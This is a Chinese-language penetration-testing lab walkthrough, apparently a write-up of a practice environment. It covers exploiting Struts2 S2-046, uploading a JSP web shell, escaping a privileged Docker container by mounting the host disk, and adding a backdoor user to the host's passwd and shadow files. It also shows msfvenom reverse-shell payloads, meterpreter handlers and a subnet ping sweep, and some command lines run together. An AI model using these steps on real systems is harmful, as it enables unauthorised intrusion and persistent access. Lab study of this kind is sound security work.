三、外网拿shell

方法一：strusts2拿shell

使用工具验证存在Struts2远程代码执行漏洞-编号S2-046。接着利用命令执行，返回root权限



尝试进行反弹shell，失败


使用stutst2利用工具，但好像环境不支持，检测存在这个漏洞但是利用不了


工具是利用不了。换一个工具。先msf生成一个Linux的jsp脚本


将生成的jsp脚本进行上传，上传后返回地址

http://192.168.10.182:2001//bak.jsp



在msf开启监听

msfdb runuse exploit/multi/handleset payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.10.129run


浏览器访问马，返回shell


直接getshell，而且是root权限

四、docker逃逸

查看用户名


查看系统进程的cgroup信息，发现可能存在docker环境


检测是否在docker中，发现存在docker环境中



利用特权模式逃逸

（开启http服务）

python3 -m http.server 8080


目录挂载

如果是通过特权模式启动容器，就可以获得大量设备文件的访问权限，因为管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。创建一个文件夹，将宿主机根目录挂载至容器目录下。

fdisk -l/usr/local/tomcat/ >cd /tmp/tmp/ >mkdir test/tmp/ >mount /dev/sda1 test/tmp/ >ls test


查看目标主机的账户密码

cat test/etc/passwd


查看kali的passwd与shadow


执行命令替换

/tmp/ >echo 'coke:x:1000:1000:coke,,,:/home/coke:/usr/bin/zsh' >> test/etc/passwd/tmp/ >echo 'coke:$y$j9T$9lrNT/MCuvXtVC4Uywr0R0$PIg8sFby4aKmUHBbIW5ox8cMW7WiiEFUBWtvjR0iv9/:18726:0:99999:7:::' >> test/etc/shadowkali:ssh COKE@192.168.10.129踩坑点：我试了很多遍都不可以，后面是直接在ubuntu上建立了一个普通用户COKE，密码为admin123，经过排查筛选后，发现可能存在的原因是因为密码不符合安全策略，要有6位以上是必要的，其次是貌似不能纯数字。(这里只好直接用Ubuntu密码直接登录ssh了)


五、内网横向


在msf进行上线

先msf生成一个elf后门文件

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.129 LPORT=5555 -f elf > /var/www/html/pay.elf


上传至web主机（一般上传至tmp目录），并赋予执行权限

chmod a+x pay.elf./pay.elf


msf开启监听

msfconsoleuse exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpsetg LHOST 192.168.10.129setg LPORT 5555exploit


执行shell

。/pay.elf


返回shell


ifconfig查看网段，发现存在183网段，可能是内网地址


探测内网存活主机

for k in $( seq 1 255);do ping -c 1 192.168.183.$k|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
